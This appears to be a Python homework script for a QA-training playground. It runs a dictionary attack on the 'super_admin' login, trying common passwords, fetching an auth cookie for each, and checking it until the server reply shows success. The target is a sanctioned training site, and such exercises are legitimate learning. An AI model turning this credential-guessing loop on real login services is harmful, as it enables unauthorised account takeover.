import requests

LOGIN = "super_admin"

PASSWORDS = [
    "password", "123456", "12345678", "qwerty", "abc123",
    "monkey", "1234567", "letmein", "trustno1", "dragon",
    "baseball", "iloveyou", "master", "sunshine", "ashley",
    "bailey", "passw0rd", "shadow", "123123", "654321",
    "superman", "qazwsx", "michael", "football", "password1",
    "12345", "1234567890", "1234", "111111", "1234567",
    "princess", "solo", "starwars", "login", "welcome",
    "admin", "access", "mustang", "696969", "batman",
    "hello", "charlie", "donald", "password2", "qwertyuiop",
]

GET_COOKIE_URL = "https://playground.learnqa.ru/ajax/api/get_secret_password_homework"
CHECK_COOKIE_URL = "https://playground.learnqa.ru/ajax/api/check_auth_cookie"

found = False

for password in PASSWORDS:
    # 1. получаем auth_cookie по логину и очередному паролю
    response = requests.post(
        GET_COOKIE_URL,
        data={"login": LOGIN, "password": password}
    )
    auth_cookie = response.cookies.get("auth_cookie")

    if not auth_cookie:
        print(f"[!] Пароль '{password}' — cookie не получена, пропускаем")
        continue

    # 2.. проверяем cookie вторым методом
    check_response = requests.post(
        CHECK_COOKIE_URL,
        cookies={"auth_cookie": auth_cookie}
    )
    result_text = check_response.text

    print(f"Пароль: {password:<20} Ответ: {result_text}")

    if result_text != "You are NOT authorized":
        print(f"\n Найден верный пароль: '{password}'")
        print(f"   Ответ сервера: {result_text}")
        found = True
        break

if not found:
    print("\n Пароль не найден среди перебранных вариантов")